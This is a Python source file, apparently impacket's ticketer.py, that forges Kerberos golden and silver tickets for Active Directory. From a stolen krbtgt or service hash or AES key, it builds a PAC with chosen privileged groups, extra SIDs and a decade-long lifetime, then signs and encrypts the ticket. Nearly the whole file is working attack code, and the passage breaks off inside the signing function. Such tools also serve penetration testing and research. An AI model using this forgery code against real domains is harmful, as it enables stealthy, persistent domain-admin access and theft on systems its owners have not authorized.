#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#    This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
#    allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the
#    groups, extrasids, etc.
#    Tickets duration is fixed to 10 years from now (although you can manually change it)
#
# References:
#    Original presentation at BlackHat USA 2014 by @gentilkiwi and @passingthehash:
#    (https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it)
#    Original implementation by Benjamin Delpy (@gentilkiwi) in mimikatz
#    (https://github.com/gentilkiwi/mimikatz)
#
# Examples:
#         ./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
#
#         will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
#         If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
#         (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as
#         baduser.ccache.
#
#         ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN>
#                       -request -user <a valid domain user> -password <valid domain user's password> baduser
#
#         will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
#         as template for customization. Whatever encryption algorithms used on that ticket will be honored,
#         hence you might need to specify both -nthash and -aesKey data. Ticket will be generated for 'baduser' and saved
#         as baduser.ccache.
#
# ToDo:
# [X] Silver tickets still not implemented - DONE by @machosec and fixes by @br4nsh
# [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
#
import argparse
import datetime
import logging
import random
import string
import sys
from calendar import timegm
from time import strptime
from binascii import unhexlify

from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.winregistry import hexdump
from impacket.dcerpc.v5.dtypes import RPC_SID
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
    SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
from impacket.examples import logger
from impacket.krb5.asn1 import AS_REP, TGS_REP, ETYPE_INFO2, AuthorizationData, EncTicketPart, EncASRepPart, EncTGSRepPart
from impacket.krb5.constants import ApplicationTagNumbers, PreAuthenticationDataTypes, EncryptionTypes, \
    PrincipalNameType, ProtocolVersionNumber, TicketFlags, encodeFlags, ChecksumTypes, AuthorizationDataType, \
    KERB_NON_KERB_CKSUM_SALT
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.crypto import _checksum_table, Enctype
from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, \
    PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, \
    VALIDATION_INFO, PAC_CLIENT_INFO, KERB_VALIDATION_INFO
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS


class TICKETER:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__target = target
        self.__domain = domain
        self.__options = options
        if options.spn:
            spn = options.spn.split('/')
            self.__service = spn[0]
            self.__server = spn[1]

        # we are creating a golden ticket
        else:
            self.__service = 'krbtgt'
            self.__server = self.__domain

    @staticmethod
    def getFileTime(t):
        t *= 10000000
        t += 116444736000000000
        return t

    def createBasicValidationInfo(self):
        # 1) KERB_VALIDATION_INFO
        kerbdata = KERB_VALIDATION_INFO()

        aTime = timegm(datetime.datetime.utcnow().timetuple())
        unixTime = self.getFileTime(aTime)

        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

        # LogoffTime: A FILETIME structure that contains the time the client's logon
        # session should expire. If the session should not expire, this structure
        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as
        # an indicator of when to warn the user that the allowed time is due to expire.
        kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF

        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user
        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the
        # client should not be logged off, this structure SHOULD have the dwHighDateTime
        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF.
        # The Kerberos service ticket end time is a replacement for KickOffTime.
        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of
        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator
        # of when the client should be forcibly disconnected.
        kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32

        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0

        # PasswordMustChange: A FILETIME structure that contains the time at which
        # theclient's password expires. If the password will not expire, this
        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
        # dwLowDateTime member set to 0xFFFFFFFF.
        kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['EffectiveName'] = self.__target
        kerbdata['FullName'] = ''
        kerbdata['LogonScript'] = ''
        kerbdata['ProfilePath'] = ''
        kerbdata['HomeDirectory'] = ''
        kerbdata['HomeDirectoryDrive'] = ''
        kerbdata['LogonCount'] = 500
        kerbdata['BadPasswordCount'] = 0
        kerbdata['UserId'] = int(self.__options.user_id)
        kerbdata['PrimaryGroupId'] = 513

        # Our Golden Well-known groups! :)
        groups = self.__options.groups.split(',')
        kerbdata['GroupCount'] = len(groups)

        for group in groups:
            groupMembership = GROUP_MEMBERSHIP()
            groupId = NDRULONG()
            groupId['Data'] = int(group)
            groupMembership['RelativeId'] = groupId
            groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['GroupIds'].append(groupMembership)

        kerbdata['UserFlags'] = 0
        kerbdata['UserSessionKey'] = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['LogonServer'] = ''
        kerbdata['LogonDomainName'] = self.__domain.upper()
        kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
        kerbdata['LMKey'] = '\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata['SubAuthStatus'] = 0
        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
        kerbdata['FailedILogonCount'] = 0
        kerbdata['Reserved3'] = 0

        kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        kerbdata['ResourceGroupIds'] = NULL

        validationInfo = VALIDATION_INFO()
        validationInfo['Data'] = kerbdata

        return validationInfo

    def createBasicPac(self, kdcRep):
        validationInfo = self.createBasicValidationInfo()
        pacInfos = {}
        pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()
        srvCheckSum = PAC_SIGNATURE_DATA()
        privCheckSum = PAC_SIGNATURE_DATA()

        if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:
            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
            privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value
            srvCheckSum['Signature'] = '\x00' * 16
            privCheckSum['Signature'] = '\x00' * 16
        else:
            srvCheckSum['Signature'] = '\x00' * 12
            privCheckSum['Signature'] = '\x00' * 12
            if len(self.__options.aesKey) == 64:
                srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
                privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value
            else:
                srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value
                privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value

        pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()
        pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()

        clientInfo = PAC_CLIENT_INFO()
        clientInfo['Name'] = self.__target.encode('utf-16le')
        clientInfo['NameLength'] = len(clientInfo['Name'])
        pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()

        return pacInfos

    def createBasicTicket(self):
        if self.__options.request is True:
            if self.__domain == self.__server:
                logging.info('Requesting TGT to target domain to use as basis')
            else:
                logging.info('Requesting TGT/TGS to target domain to use as basis')

            if self.__options.hashes is not None:
                lmhash, nthash = self.__options.hashes.split(':')
            else:
                lmhash = ''
                nthash = ''
            userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(lmhash), unhexlify(nthash), None,
                                                                    self.__options.dc_ip)
            if self.__domain == self.__server:
                kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            else:
                serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)
                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, None, tgt, cipher,
                                                                        sessionKey)
                kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            # Let's check we have all the necessary data based on the ciphers used. Boring checks
            ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
            encPartCipher = int(kdcRep['enc-part']['etype'])

            if (ticketCipher == EncryptionTypes.rc4_hmac.value or encPartCipher == EncryptionTypes.rc4_hmac.value) and \
                            self.__options.nthash is None:
                logging.critical('rc4_hmac is used in this ticket and you haven\'t specified the -nthash parameter. '
                                 'Can\'t continue ( or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or
                encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and \
                self.__options.aesKey is None:
                logging.critical(
                    'aes128_cts_hmac_sha1_96 is used in this ticket and you haven\'t specified the -aesKey parameter. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value or
                encPartCipher == EncryptionTypes.aes128_cts_hmac_sha1_96.value) and \
                self.__options.aesKey is not None and len(self.__options.aesKey) > 32:
                logging.critical(
                    'aes128_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes128. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if (ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or
                 encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and self.__options.aesKey is None:
                logging.critical(
                    'aes256_cts_hmac_sha1_96 is used in this ticket and you haven\'t specified the -aesKey parameter. '
                    'Can\'t continue (or try running again w/o the -request option)')
                return None, None

            if ( ticketCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value or
                 encPartCipher == EncryptionTypes.aes256_cts_hmac_sha1_96.value) and \
                 self.__options.aesKey is not None and len(self.__options.aesKey) < 64:
                logging.critical(
                    'aes256_cts_hmac_sha1_96 is used in this ticket and the -aesKey you specified is not aes256. '
                    'Can\'t continue')
                return None, None
            kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            kdcRep['cname']['name-string'] = noValue
            kdcRep['cname']['name-string'][0] = self.__target

        else:
            logging.info('Creating basic skeleton ticket and PAC Infos')
            if self.__domain == self.__server:
                kdcRep = AS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.AS_REP.value
            else:
                kdcRep = TGS_REP()
                kdcRep['msg-type'] = ApplicationTagNumbers.TGS_REP.value
            kdcRep['pvno'] = 5
            if self.__options.nthash is None:
                kdcRep['padata'] = noValue
                kdcRep['padata'][0] = noValue
                kdcRep['padata'][0]['padata-type'] = PreAuthenticationDataTypes.PA_ETYPE_INFO2.value

                etype2 = ETYPE_INFO2()
                etype2[0] = noValue
                if len(self.__options.aesKey) == 64:
                    etype2[0]['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                else:
                    etype2[0]['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
                etype2[0]['salt'] = '%s%s' % (self.__domain.upper(), self.__target)
                encodedEtype2 = encoder.encode(etype2)

                kdcRep['padata'][0]['padata-value'] = encodedEtype2

            kdcRep['crealm'] = self.__domain.upper()
            kdcRep['cname'] = noValue
            kdcRep['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            kdcRep['cname']['name-string'] = noValue
            kdcRep['cname']['name-string'][0] = self.__target

            kdcRep['ticket'] = noValue
            kdcRep['ticket']['tkt-vno'] = ProtocolVersionNumber.pvno.value
            kdcRep['ticket']['realm'] = self.__domain.upper()
            kdcRep['ticket']['sname'] = noValue
            kdcRep['ticket']['sname']['name-string'] = noValue
            kdcRep['ticket']['sname']['name-string'][0] = self.__service

            if self.__domain == self.__server:
                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
                kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()
            else:
                kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
                kdcRep['ticket']['sname']['name-string'][1] = self.__server

            kdcRep['ticket']['enc-part'] = noValue
            kdcRep['ticket']['enc-part']['kvno'] = 2
            kdcRep['enc-part'] = noValue
            if self.__options.nthash is None:
                if len(self.__options.aesKey) == 64:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value
                else:
                    kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
                    kdcRep['enc-part']['etype'] = EncryptionTypes.aes128_cts_hmac_sha1_96.value
            else:
                kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value
                kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value

            kdcRep['enc-part']['kvno'] = 2
            kdcRep['enc-part']['cipher'] = noValue

        pacInfos = self.createBasicPac(kdcRep)

        return kdcRep, pacInfos

    def customizeTicket(self, kdcRep, pacInfos):
        logging.info('Customizing ticket for %s/%s' % (self.__domain, self.__target))
        encTicketPart = EncTicketPart()

        flags = list()
        flags.append(TicketFlags.forwardable.value)
        flags.append(TicketFlags.proxiable.value)
        flags.append(TicketFlags.renewable.value)
        if self.__domain == self.__server: 
            flags.append(TicketFlags.initial.value)
        flags.append(TicketFlags.pre_authent.value)
        encTicketPart['flags'] = encodeFlags(flags)
        encTicketPart['key'] = noValue
        encTicketPart['key']['keytype'] = kdcRep['ticket']['enc-part']['etype']

        if encTicketPart['key']['keytype'] == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.letters) for _ in range(16)])
        elif encTicketPart['key']['keytype'] == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.letters) for _ in range(32)])
        else:
            encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.letters) for _ in range(16)])

        encTicketPart['crealm'] = self.__domain.upper()
        encTicketPart['cname'] = noValue
        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
        encTicketPart['cname']['name-string'] = noValue
        encTicketPart['cname']['name-string'][0] = self.__target

        encTicketPart['transited'] = noValue
        encTicketPart['transited']['tr-type'] = 0
        encTicketPart['transited']['contents'] = ''

        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
        # Let's extend the ticket's validity a lil bit
        ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(days=int(self.__options.duration))
        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
        encTicketPart['authorization-data'] = noValue
        encTicketPart['authorization-data'][0] = noValue
        encTicketPart['authorization-data'][0]['ad-type'] = AuthorizationDataType.AD_IF_RELEVANT.value
        encTicketPart['authorization-data'][0]['ad-data'] = noValue

        # Let's locate the KERB_VALIDATION_INFO and Checksums
        if pacInfos.has_key(PAC_LOGON_INFO):
            data = pacInfos[PAC_LOGON_INFO]
            validationInfo = VALIDATION_INFO()
            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
            lenVal = len(validationInfo.getData())
            validationInfo.fromStringReferents(data[lenVal:], lenVal)

            aTime = timegm(strptime(str(encTicketPart['authtime']), '%Y%m%d%H%M%SZ'))

            unixTime = self.getFileTime(aTime)

            kerbdata = KERB_VALIDATION_INFO()

            kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
            kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

            # Let's adjust username and other data
            validationInfo['Data']['LogonDomainName'] = self.__domain.upper()
            validationInfo['Data']['EffectiveName'] = self.__target
            # Our Golden Well-known groups! :)
            groups = self.__options.groups.split(',')
            validationInfo['Data']['GroupIds'] = list()
            validationInfo['Data']['GroupCount'] = len(groups)

            for group in groups:
                groupMembership = GROUP_MEMBERSHIP()
                groupId = NDRULONG()
                groupId['Data'] = int(group)
                groupMembership['RelativeId'] = groupId
                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
                validationInfo['Data']['GroupIds'].append(groupMembership)

            # Let's add the extraSid
            if self.__options.extra_sid is not None:
                extrasids = self.__options.extra_sid.split(',')
                if validationInfo['Data']['SidCount'] == 0:
                    # Let's be sure user's flag specify we have extra sids.
                    validationInfo['Data']['UserFlags'] |= 0x20
                    validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
                for extrasid in extrasids:
                    validationInfo['Data']['SidCount'] += 1

                    sidRecord = KERB_SID_AND_ATTRIBUTES()

                    sid = RPC_SID()
                    sid.fromCanonical(extrasid)

                    sidRecord['Sid'] = sid
                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED

                    # And, let's append the magicSid
                    validationInfo['Data']['ExtraSids'].append(sidRecord)
            else:
                validationInfo['Data']['ExtraSids'] = NULL

            validationInfoBlob  = validationInfo.getData() + validationInfo.getDataReferents()
            pacInfos[PAC_LOGON_INFO] = validationInfoBlob

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('VALIDATION_INFO after making it gold')
                validationInfo.dump()
                print ('\n')
        else:
            raise Exception('PAC_LOGON_INFO not found! Aborting')

        logging.info('\tPAC_LOGON_INFO')

        # Let's now clear the checksums
        if pacInfos.has_key(PAC_SERVER_CHECKSUM):
            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
            if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                serverChecksum['Signature'] = '\x00' * 12
            elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                serverChecksum['Signature'] = '\x00' * 12
            else:
                serverChecksum['Signature'] = '\x00' * 16
            pacInfos[PAC_SERVER_CHECKSUM] = serverChecksum.getData()
        else:
            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')

        if pacInfos.has_key(PAC_PRIVSVR_CHECKSUM):
            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
            privSvrChecksum['Signature'] = '\x00' * 12
            if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
                privSvrChecksum['Signature'] = '\x00' * 12
            elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
                privSvrChecksum['Signature'] = '\x00' * 12
            else:
                privSvrChecksum['Signature'] = '\x00' * 16
            pacInfos[PAC_PRIVSVR_CHECKSUM] = privSvrChecksum.getData()
        else:
            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')

        if pacInfos.has_key(PAC_CLIENT_INFO_TYPE):
            pacClientInfo = PAC_CLIENT_INFO(pacInfos[PAC_CLIENT_INFO_TYPE])
            pacClientInfo['ClientId'] = unixTime
            pacInfos[PAC_CLIENT_INFO_TYPE] = pacClientInfo.getData()
        else:
            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')

        logging.info('\tPAC_CLIENT_INFO_TYPE')
        logging.info('\tEncTicketPart')

        if self.__domain == self.__server:
            encRepPart = EncASRepPart()
        else:
            encRepPart = EncTGSRepPart()

        encRepPart['key'] = noValue
        encRepPart['key']['keytype'] = encTicketPart['key']['keytype']
        encRepPart['key']['keyvalue'] = encTicketPart['key']['keyvalue']
        encRepPart['last-req'] = noValue
        encRepPart['last-req'][0] = noValue
        encRepPart['last-req'][0]['lr-type'] = 0
        encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
        encRepPart['nonce'] = 123456789
        encRepPart['key-expiration'] = KerberosTime.to_asn1(ticketDuration)
        encRepPart['flags'] = encodeFlags(flags)
        encRepPart['authtime'] = encTicketPart['authtime']
        encRepPart['endtime'] = encTicketPart['endtime']
        encRepPart['starttime'] = encTicketPart['starttime']
        encRepPart['renew-till'] = encTicketPart['renew-till']
        encRepPart['srealm'] = self.__domain.upper()
        encRepPart['sname'] = noValue
        encRepPart['sname']['name-string'] = noValue
        encRepPart['sname']['name-string'][0] = self.__service

        if self.__domain == self.__server:
            encRepPart['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
            encRepPart['sname']['name-string'][1] = self.__domain.upper()
            logging.info('\tEncAsRepPart')
        else:
            encRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
            encRepPart['sname']['name-string'][1] = self.__server
            logging.info('\tEncTGSRepPart')

        return encRepPart, encTicketPart, pacInfos

    def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):
        logging.info('Signing/Encrypting final ticket')

        # We changed everything we needed to make us special. Now let's repack and calculate checksums
        validationInfoBlob = pacInfos[PAC_LOGON_INFO]
        validationInfoAlignment = '\x00' * (((len(validationInfoBlob) + 7) / 8 * 8) - len(validationInfoBlob))

        pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
        pacClientInfoAlignment = '\x00' * (((len(pacClientInfoBlob) + 7) / 8 * 8) - len(pacClientInfoBlob))

        serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
        serverChecksumBlob = str(pacInfos[PAC_SERVER_CHECKSUM])
        serverChecksumAlignment = '\x00' * (((len(serverChecksumBlob) + 7) / 8 * 8) - len(serverChecksumBlob))

        privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
        privSvrChecksumBlob = str(pacInfos[PAC_PRIVSVR_CHECKSUM])
        privSvrChecksumAlignment = '\x00' * (((len(privSvrChecksumBlob) + 7) / 8 * 8) - len(privSvrChecksumBlob))

        # The offset are set from the beginning of the PAC_TYPE
        # [MS-PAC] 2.4 PAC_INFO_BUFFER
        offsetData = 8 + len(str(PAC_INFO_BUFFER())) * 4

        # Let's build the PAC_INFO_BUFFER for each one of the elements
        validationInfoIB = PAC_INFO_BUFFER()
        validationInfoIB['ulType'] = PAC_LOGON_INFO
        validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
        validationInfoIB['Offset'] = offsetData
        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) / 8 * 8

        pacClientInfoIB = PAC_INFO_BUFFER()
        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
        pacClientInfoIB['Offset'] = offsetData
        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) / 8 * 8

        serverChecksumIB = PAC_INFO_BUFFER()
        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
        serverChecksumIB['Offset'] = offsetData
        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) / 8 * 8

        privSvrChecksumIB = PAC_INFO_BUFFER()
        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
        privSvrChecksumIB['Offset'] = offsetData
        # offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8

        # Building the PAC_TYPE as specified in [MS-PAC]
        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(
            privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(
            pacInfos[PAC_CLIENT_INFO_TYPE]) + pacClientInfoAlignment
        buffersTail = str(serverChecksumBlob) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment

        pacType = PACTYPE()
        pacType['cBuffers'] = 4
        pacType['Version'] = 0
        pacType['Buffers'] = buffers + buffersTail

        blobToChecksum = str(pacType)

        checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
        if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
            keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
            keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
        elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
            keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))
        else:
            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])

        checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]
        if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
            keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))
        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
            keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))
        elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:
            keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))
        else:
            raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])

        serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)
        logging.info('\tPAC_SERVER_CHECKSUM')
        privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])
        logging.info('\tPAC_PRIVSVR_CHECKSUM')

        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
        pacType['Buffers'] = buffers + buffersTail

        authorizationData = AuthorizationData()
        authorizationData[0] = noValue
        authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value
        authorizationData[0]['ad-data'] = str(pacType)
        authorizationData = encoder.encode(authorizationData)

        encTicketPart['authorization-data'][0]['ad-data'] = authorizationData

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Customized EncTicketPart')
            print encTicketPart.prettyPrint()
            print ('\n')

        encodedEncTicketPart = encoder.encode(encTicketPart)

        cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]
        if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
        elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(self.__options.aesKey))
        elif cipher.enctype == EncryptionTypes.rc4_hmac.value:
            key = Key(cipher.enctype, unhexlify(self.__options.nthash))
        else:
            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)

        # Key Usage 2
        # AS-REP Ticket and TGS-REP Ticket (includes TGS session
        # key or application session key), encrypted with the
        # service key (Section 5.3)
        logging.info('\tEncTicketPart')
        cipherText = cipher.encrypt(key, 2, str(encodedEncTicketPart), None)

        kdcRep['ticket']['enc-part']['cipher'] = cipherText
        kdcRep['ticket']['enc-part']['kvno'] = 2

        # Lastly.. we have to encrypt the kdcRep['enc-part'] part
        # with a key we chose. It actually doesn't really matter since nobody uses it (could it be trash?)
        encodedEncASRepPart = encoder.encode(encASorTGSRepPart)

        if self.__domain == self.__server:
            # Key Usage 3
            # AS-REP encrypted part (includes TGS session key or
            # application session key), encrypted with the client key
            # (Section 5.4.2)
            sessionKey = Key(cipher.enctype, str(encASorTGSRepPart['key']['keyvalue']))
            logging.info('\tEncASRepPart')
